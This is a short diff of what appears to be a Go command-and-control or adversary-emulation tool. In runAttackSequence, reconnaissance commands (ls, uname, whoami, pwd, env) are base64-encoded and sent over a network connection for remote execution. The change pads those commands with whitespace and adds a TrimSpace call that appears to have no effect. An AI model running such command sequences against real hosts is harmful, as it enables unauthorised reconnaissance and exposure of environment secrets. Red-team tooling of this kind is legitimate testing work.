@@ -49,7 +49,7 @@ func downloadFile(conn *tls.Conn, path string) {
 }
 
 func main() {
-	var cmdsToRun = []string{"ls", "uname", "whoami", "pwd", "env"}
+	var cmdsToRun = []string{"ls", "uname ", " whoami", "pwd      ", "env"}
 	arguments := os.Args
 	checkFlags(arguments, len(arguments), cmdsToRun)
 	var PORT string
@@ -172,7 +172,7 @@ func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 	for _, element := range cmdsToRun {
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
 		logger.Println("EXECUTE: " + " " + element)
-		_, err := conn.Write([]byte(encodedStr))
+		_, err := conn.Write([]byte(strings.TrimSpace(encodedStr)))
 		handleError(err)
 		time.Sleep(time.Second)
 	}
